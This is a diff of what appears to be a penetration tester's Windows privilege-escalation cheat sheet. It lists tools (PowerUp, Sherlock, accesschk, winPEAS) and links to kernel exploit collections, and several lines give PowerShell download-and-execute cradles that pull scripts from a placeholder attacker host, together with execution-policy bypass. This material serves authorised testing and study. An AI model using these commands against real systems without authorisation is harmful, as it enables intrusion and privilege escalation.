@@ -546,14 +546,14 @@ kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from
 ## Tools
 1. [winPEAS](https://github.com/carlospolop/priviledge-escalation-awesome-scripts-suite/tree/master/winPEAS)
 2. [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
-   - Needs to be run from powershell
-   - Searches for specific privilege escalation misconfigurations
-   - `powershell -exec bypass`
-   - `..\PowerUp.ps1`
-   - `Invoke-AllChecks`
+   - `IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/PowerUp.ps1')`
+   - `powershell -exec bypass` -> `..\PowerUp.ps1` -> `Invoke-AllChecks`
 3. [Seatbelt](https://github.com/GhostPack/Seatbelt)
 4. [accesschk.exe](https://github.com/Andross/oscp/raw/main/accesschk.exe)
-5. **check service permissions (Which users can access and with what level of permissions)**
+* Checks user access control rights. This tools can be used to check wheter a user or group has access to files, directorys, services, and registry keys.
+* You can supply the tool with different usernames to check for:
+`.\accesscheck /accepteula -uvqc username servicename`
+**check service permissions (Which users can access and with what level of permissions)**
 `.\accesscheck /accepteula -quvw "C:\This\Is\The\Path"`
 **check for start stop permission**
 `.\accesscheck /accepteula -uvqc servicename`
@@ -563,6 +563,14 @@ kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from
 **Find all weak file permissions per drive.**
 ``accesschk.exe -uwqs Users c:.``
 ``accesschk.exe -uwqs "Authenticated Users" c:.``
+
+5. [Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)
+- `IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/Sherlock.ps1')`
+- `powershell.exe -nop -exec bypass` -> `PS C:\> Import-Module .Sherlock.ps1` -> `PS C:\> Find-AllVulns`
+
+### Windows Exploits DB
+- https://github.com/SecWiki/windows-kernel-exploits
+- https://github.com/abatchy17/WindowsExploits
 
 ## Enumeration (https://github.com/gquere/WindowsPentestCommands)
 ### Pre-checks
@@ -642,27 +650,6 @@ netsh firewall show state
 netsh firewall show config
 netsh dump
 ```
-
-### Use Powerup https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
-```bash
-# perform quick checks against a Windows machine for any privilege escalation opportunities
-IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/PowerUp.ps1')
-powershell.exe -nop -exec bypass
-PS C:\> Import-Module .\PowerUp.ps1
-PS C:\> Invoke-AllChecks
-```
-
-### Use Sherlock https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1 
-```bash
-IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/Sherlock.ps1')
-powershell.exe -nop -exec bypass
-PS C:\> Import-Module .Sherlock.ps1
-PS C:\> Find-AllVulns
-```
-
-### Windows Exploits DB
-- https://github.com/SecWiki/windows-kernel-exploits
-- https://github.com/abatchy17/WindowsExploits
 
 ## Windows common command
 ### Adding Users Locally
